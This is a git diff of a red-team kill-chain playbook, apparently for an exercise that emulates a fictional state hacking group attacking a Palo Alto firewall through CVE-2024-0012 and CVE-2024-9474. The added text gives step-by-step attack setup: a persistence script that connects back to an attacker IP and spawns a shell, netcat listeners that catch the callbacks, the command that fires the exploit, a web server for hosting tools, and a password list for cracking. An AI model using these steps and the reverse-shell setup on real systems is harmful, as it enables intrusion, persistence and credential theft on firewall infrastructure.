@@ -1,4 +1,4 @@
-# Phase 0: Initial Setup for Kill Chain
+# Introduction
 
 Background: Sassy Panda is an Eastonian government affiliated cyber group falling under the Eastonian Cyber Agency (ECA) and comprised of Easton’s most sophisticated capabilities and equipment. Sassy Panda typically focuses on espionage and information gathering and has targeted critical infrastructure in the U.S. including the New England region. Having been active for over 15 years in the computer network exploitation game, the group has emphasized stealth in operations using web shells, living-off-the-land (LOTL) binaries, hands-on-keyboard activities, and stolen credentials.
 
@@ -11,8 +11,11 @@ Account Discovery: Domain Account, Archive Collected Data: Archive via Utility, 
 
 
 Target: Palo Alto firewall management interface at XXX.XXX.XXX.XXX
- Exploit Used: PoC.py
- CVE: CVE-2024-0012 and CVE-2024-9474
+Exploit Used: PoC.py
+CVE: CVE-2024-0012 and CVE-2024-9474
+
+ 
+# Phase 0: Initial Setup for Kill Chain
 
 Exploit Setup:
 
@@ -20,13 +23,14 @@ Exploit Setup:
 2. Open a text editor on the attack machine (preferably nano).
 3. Copy and paste the PoC.py script into the text editor (best case of doing this is utilizing ClickPaste and keep the name the same)
 4. If using nano, press ctrl+O and then enter to write out the file, then press ctrl+X to exit the program
-5. chmod +x PoC.py
+5. `chmod +x PoC.py`
    
 
 Persistence Script Setup:
 
-1. Perform the following command: nano pan_os_comm.py
+1. Perform the following command: `nano pan_os_comm.py`
 2. In nano, copy and paste the below script: ***NOTE- BE SURE TO CHANGE THE IP ADDRESS AND PORT IN THE "s.connect(("10.10.100.169", 63842))" LINE TO MATCH THE IP ADDRESS OF YOUR ATTACK MACHINE AND A RANDOM HIGH PORT OF YOUR CHOICE- end note :) *** Please remember the random high port you choose as you will have to recall it for use in setting up your initial listener and throwing the export.
+3. Once created, run the following command: `chmod +x pan_os_comm.py`
 
 ```
 #!/usr/bin/env python3
@@ -50,13 +54,127 @@ pty.spawn("sh")
 
 ```
 
+*Host Your Tools Folder On A Web Server*
+
+1. In the folder where you have created your tools, start a web server to host the necessary files for the exploit
+   Run the below command to start the web server:
+   `python3 -m http.server <port>`
+
+
+*Update Your rockyou.txt Wordlist For Later Password Cracking*
+
+Through OSINT and recon, we have located a list of compromised passwords from users within this company. Lets update our rockyou.txt password list to perform offline cracking hashes.
+
+1. Locate your rockyou.txt file and open using sudo.
+2. Once open, append the below to list of passwords to the to the list.
+   	`sudo nano /usr/share/wordlists/rockyou.txt
+   	 (copy and paste the below list)
+         ctrl+O
+   	 ctrl+X`
+
+PASSWORD LIST:   
+
+Summer2025
+JohnDoe123
+Password123!
+Football@2023
+C0ffeeMorn1ng
+Ilov3mydog!
+ChocolateCake1
+BlueSky_2024
+P@ssword2024!
+Tiger@12345
+!LoveCoding4U
+Il0vePizza!
+$uperman2024
+RedCar$2023
+L0veMyPet$
+PurpleRain2024
+!BrightSun2023
+P@rtn3rInLife!
+M@rtha12!
+FishingTrip#2024
+Coffee_@123
+B@by_Queen23
+NewYork2024!
+BestD@y2024
+E@gleEye2023
+Amazing_2024!
+St@rWars123
+!QAZ@WSX1qaz2wsx
+Sugar@L0ve
+Little_Lamb2024
+Super@star23
+T1me2W1n
+Alp@caFarm2024
+B@by1Cats
+T3aTime#2024
+Gr@ndma!2023
+Working@Home
+L@ndscape_123
+Nature@Beach2024
+Morning!Vibes
+Winter!2024_
+D0gLovers123
+K!ttenTime2024
+PuppyLove_23
+Peachy@Life24
+Fancy_2024!
+BeachTime24
+SleepyM0rning!
+G0ldenMoon#23
+CoolDays@123
+
+
+- Now that you are fully set up, move to Phase 1.
 
 # Phase 1: Initial Access via Palo Alto Exploit
+
+Section 1. Setting Up Listeners
+
+1. Open up your terminal, and if you dont already have 4, go to your terminal preferences and change the settings to start with 4 panes.
+2. In one of the terminal panes, set up your initial lsitener using Netcat to catch the callback shell from the exploit. Be sure to note the port that you are using for this listener, as it will be needed when initiating the exploit.
+   	`nc -lnv <random port>`
+3. In another terminal pane, set up a second listener to catch the beacon once the cron job is set up on the compromised Palo. Use the port provided in the *pan_os_comm.py* script that was created earlier.
+4. Run the following command to start the second listener:
+	`nc -lnv <port used in script>`
+
+Section 2. Execute the PoC Script
+
+1. In one of the empty terminal panes, execute the PoC.py script to trigger the exploit:
+   	`python PoC.py https://<ip_of_palo_management_interface> <ip_address_of_attack_box> <port_of_initial_listener>`
+2. Watch the initial listener pane to ensure it catches the callback from the exploit.
+   	If you see the following, you have successfully exploited the Palo Alto and now have a limited bash shell into the root of the system:
+	![image](https://github.com/user-attachments/assets/0d3b2d49-fe66-4dcb-80da-51204efebfbc)
+
+   	If you do not see the following, its time to troubleshoot.
+   	Troubleshooting steps:
+   	1. Ensure you are using the correct IP addresses and ports in your listeners and exploit arguments
+   	2. Ensure there is routing to the Palo Management Interface.
+   	3. Ensure you copied your exploit script over correctly
+   	4. If all else fails, find a Sassy Panda SME and pray they have the answers :-)
+
+
+
+
+
 
 Post-Exploitation:
 ● Upgrade shell if necessary.
 ● Identify internal routes/interfaces.
 ● Upload a simple proxy (e.g., socat or chisel) if needed for tunneling
+
+
+
+
+
+
+
+
+
+
+
+
 
 # Phase 2: Internal Reconnaissance & Enumeration
 Once inside the firewall OS:
